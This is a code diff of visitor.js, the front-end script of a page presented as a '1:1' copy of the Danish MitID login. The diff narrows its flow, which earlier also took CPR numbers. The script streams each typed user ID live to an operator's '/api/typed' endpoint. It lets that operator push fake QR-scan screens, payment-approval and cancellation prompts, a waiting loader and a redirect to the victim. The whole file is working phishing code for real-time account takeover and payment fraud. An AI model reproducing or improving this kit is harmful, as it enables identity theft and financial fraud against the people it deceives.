@@ -1,143 +1,111 @@
 /* ════════════════════════════════════════════════════════════
-   visitor.js — 1:1 MitID-flow (som rigtige login.php)
-   KUNDENS EGET FLOW: Bruger-ID → CPR → (loader) → venter på admin
-   ADMIN CAN OVERRIDE: scan / betaling / annuller / approved
+   visitor.js — 1:1 MitID (hej.rf.gd kopi)
+   Forside = ALTID Bruger-ID. Admin kan skifte til QR/Betaling/etc.
    ════════════════════════════════════════════════════════════ */
-let serverFlow = null;    // flow som admin har sat
-let localStep = 'brugerid'; // kundens lokale trin (brugerid -> cpr -> wait)
-let lastServerSig = null;
+let serverFlow = null;
+let lastSig = null;
 let qrDrawn = null;
+let redirectTimer = null;
 
 const $ = (id) => document.getElementById(id);
-const show = (el) => { if (el) el.classList.remove('hidden'); };
-const hide = (el) => { if (el) el.classList.add('hidden'); };
+const show = (id) => { const el = $(id); if (el) el.classList.remove('hidden'); };
+const hide = (id) => { const el = $(id); if (el) el.classList.add('hidden'); };
+const hideAll = () => { ['loaderContainer','stepBruger','stepQr','stepBetaling','stepWait'].forEach(hide); };
 
 /* ── TRIN VISNINGER ── */
-function showBrugerId() {
-  hide($('stepCpr')); hide($('stepQr')); hide($('stepBetaling')); hide($('loaderContainer'));
-  show($('stepBruger'));
-  $('formHeading').textContent = 'Log på';
-}
-
-function showCpr() {
-  hide($('stepBruger')); hide($('stepQr')); hide($('stepBetaling')); hide($('loaderContainer'));
-  show($('stepCpr'));
-  $('formHeading').textContent = 'Log på';
-  const cpr = $('cprInput');
-  if (cpr) cpr.focus();
-}
-
-function showQr(s) {
-  hide($('stepBruger')); hide($('stepCpr')); hide($('stepBetaling')); hide($('loaderContainer'));
-  show($('stepQr'));
-  $('formHeading').textContent = 'Log på';
+function vBrugerId() { hideAll(); show('stepBruger'); $('formHeading').textContent = 'Log på hos MitID.dk'; }
+function vQr(s) {
+  hideAll(); show('stepQr');
+  $('formHeading').textContent = 'Log på hos MitID.dk';
   const url = s.sessionId ? window.location.origin + '/r/' + s.sessionId : 'https://mitid.dk';
   if (url !== qrDrawn) {
-    const el = $('qrcode');
-    el.innerHTML = '';
+    const el = $('qrcode'); el.innerHTML = '';
     if (window.QRCode) new QRCode(el, { text: url, width: 200, height: 200, colorDark: '#000', colorLight: '#fff', correctLevel: QRCode.CorrectLevel.M });
     qrDrawn = url;
   }
 }
-
-function showBetaling(s, annulerer) {
-  hide($('stepBruger')); hide($('stepCpr')); hide($('stepQr')); hide($('loaderContainer'));
-  show($('stepBetaling'));
-  $('formHeading').textContent = annulerer ? 'Annullering' : 'Bekræft';
+function vBetaling(s, isAnnuller) {
+  hideAll(); show('stepBetaling');
   const a = s.action || {};
-  const amt = $('betAmount');
-  amt.textContent = a.amount || '';
-  amt.style.color = annulerer ? '#dc2626' : '#000';
-  $('betTitle').textContent = a.title || (annulerer ? 'Annullering af betaling' : 'Slet denne betaling');
-  $('betDetail').textContent = a.detail || '';
+  $('formHeading').textContent = isAnnuller ? 'Annullering' : 'Bekræft betaling';
+  $('betAmount').textContent = a.amount || '';
+  $('betAmount').style.color = isAnnuller ? '#dc2626' : '#1a1a1a';
+  $('betTitle').textContent = a.title || (isAnnuller ? 'Annullering af betaling' : 'Godkend denne betaling');
 }
-
-function showWait() {
-  hide($('stepBruger')); hide($('stepCpr')); hide($('stepQr')); hide($('stepBetaling'));
-  show($('loaderContainer'));
+function vWait() {
+  hideAll(); show('loaderContainer');
   $('formHeading').textContent = '';
 }
+function vApproved(s) {
+  hideAll(); show('stepWait');
+  $('formHeading').textContent = 'Godkendt';
+  if (s.target && s.target.trim()) {
+    clearTimeout(redirectTimer);
+    redirectTimer = setTimeout(() => { window.location.href = s.target.trim(); }, 1500);
+  }
+}
 
-/* ── KUNDENS EGET INPUT-FLOW ── */
-const brugerInput = $('brugerIdInput');
-const brugerBtn = $('brugerBtn');
-const cprInput = $('cprInput');
-const cprBtn = $('cprBtn');
+/* ── RENDER: server-flow styrer, men forside er ALTID bruger-id hvis ingen admin-flow ── */
+function render(s) {
+  if (!s) return;
+  const sg = JSON.stringify([s.live, s.flow, s.sessionId, s.tekst, (s.action||{}).title, (s.action||{}).amount, (s.action||{}).detail]);
+  if (sg === lastSig) return;
+  lastSig = sg;
+
+  if (!s.live) {
+    // forside = bruger-ID
+    hideAll(); show('stepBruger');
+    $('formHeading').textContent = 'Log på hos MitID.dk';
+    return;
+  }
+  const f = s.flow || 'brugerid';
+  switch (f) {
+    case 'scan': vQr(s); break;
+    case 'betaling': vBetaling(s, false); break;
+    case 'annuller': vBetaling(s, true); break;
+    case 'wait': vWait(); break;
+    case 'approved': vApproved(s); break;
+    case 'brugerid':
+    default: vBrugerId();
+  }
+}
+
+/* ── BRUGER-ID INPUT: live-til-admin + enable FORTSÆT ── */
+const inp = $('brugerIdInput');
+const btn = $('brugerBtn');
 let typedTimer = null;
 
-// Skjul/Vis
-$('hideBtn').addEventListener('click', function () {
-  if (brugerInput.type === 'text') { brugerInput.type = 'password'; this.textContent = 'Vis'; }
-  else { brugerInput.type = 'text'; this.textContent = 'Skjul'; }
-});
-
-// Bruger-ID input live-til-admin + aktiver knap
-brugerInput.addEventListener('input', function () {
+inp.addEventListener('input', function () {
   const v = this.value.trim();
-  brugerBtn.disabled = !v;
-  brugerBtn.className = 'btn-primary ' + (v ? 'active' : 'disabled');
+  if (v) {
+    btn.disabled = false;
+    btn.classList.remove('bg-[#cccccc]', 'cursor-not-allowed');
+    btn.classList.add('bg-[#0060e6]', 'cursor-pointer', 'hover:bg-[#0049b8]');
+  } else {
+    btn.disabled = true;
+    btn.classList.add('bg-[#cccccc]', 'cursor-not-allowed');
+    btn.classList.remove('bg-[#0060e6]', 'cursor-pointer', 'hover:bg-[#0049b8]');
+  }
   clearTimeout(typedTimer);
   typedTimer = setTimeout(() => {
     fetch('/api/typed', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ brugerId: v }) }).catch(() => {});
   }, 400);
 });
 
-// FORTSÆT fra Bruger-ID → CPR (lokal skift, som login.php)
-brugerBtn.addEventListener('click', () => {
-  const v = brugerInput.value.trim();
+// FORTSÆT: send + vis loader
+btn.addEventListener('click', () => {
+  const v = inp.value.trim();
   if (!v) return;
   fetch('/api/typed', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ brugerId: v }) }).catch(() => {});
-  localStep = 'cpr';
-  showCpr();
+  hideAll(); show('loaderContainer');
+  $('formHeading').textContent = '';
 });
 
-// CPR input-format DDMMÅÅ-XXXX
-cprInput.addEventListener('input', function () {
-  let v = this.value.replace(/\D/g, '').slice(0, 10);
-  if (v.length > 6) v = v.slice(0, 6) + '-' + v.slice(6);
-  this.value = v;
-  const ready = v.replace('-', '').length >= 10;
-  cprBtn.disabled = !ready;
-  cprBtn.className = 'btn-primary ' + (ready ? 'active' : 'disabled');
+// Skjul/Vis
+$('hideBtn').addEventListener('click', function () {
+  if (inp.type === 'text') { inp.type = 'password'; this.textContent = 'Vis'; }
+  else { inp.type = 'text'; this.textContent = 'Skjul'; }
 });
-
-// FORTSÆT fra CPR → send til admin → vis loader
-cprBtn.addEventListener('click', () => {
-  const v = cprInput.value.trim();
-  if (v.replace('-', '').length < 10) return;
-  fetch('/api/typed', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cpr: v }) }).catch(() => {});
-  localStep = 'wait';
-  showWait();
-});
-
-/* ── SERVER-FLOW: admin kan override ── */
-function render(s) {
-  if (!s || !s.live) {
-    hide($('stepBruger')); hide($('stepCpr')); hide($('stepQr')); hide($('stepBetaling')); hide($('loaderContainer'));
-    $('formHeading').textContent = 'MitID';
-    return;
-  }
-  const serverF = s.flow || 'brugerid';
-  if (serverF === serverFlow) return;  // ingen ændring fra admin — behold kundens lokale trin
-  serverFlow = serverF;
-
-  // admin-styrede trin (QR, betaling, annuller, wait, approved)
-  switch (serverF) {
-    case 'scan': localStep = 'scan'; showQr(s); break;
-    case 'betaling': localStep = 'betaling'; showBetaling(s, false); break;
-    case 'annuller': localStep = 'annuller'; showBetaling(s, true); break;
-    case 'wait': localStep = 'wait'; showWait(); break;
-    case 'approved':
-      hide($('stepBruger')); hide($('stepCpr')); hide($('stepQr')); hide($('stepBetaling')); hide($('loaderContainer'));
-      $('formHeading').textContent = 'Godkendt';
-      if (s.target && s.target.trim()) setTimeout(() => { window.location.href = s.target.trim(); }, 1500);
-      break;
-    case 'brugerid':
-      // admin vil vise bruger-ID trin - vis CPR hvis kunden allerede har tastet, ellers bruger-ID
-      if (localStep === 'cpr') showCpr(); else showBrugerId();
-      break;
-  }
-}
 
 /* ── POLL + SOCKET ── */
 async function poll() {
@@ -148,4 +116,4 @@ async function poll() {
 }
 poll();
 try { const socket = io(); socket.on('state-update', render); } catch (e) {}
-setInterval(poll, 1000);
+setInterval(poll, 1200);
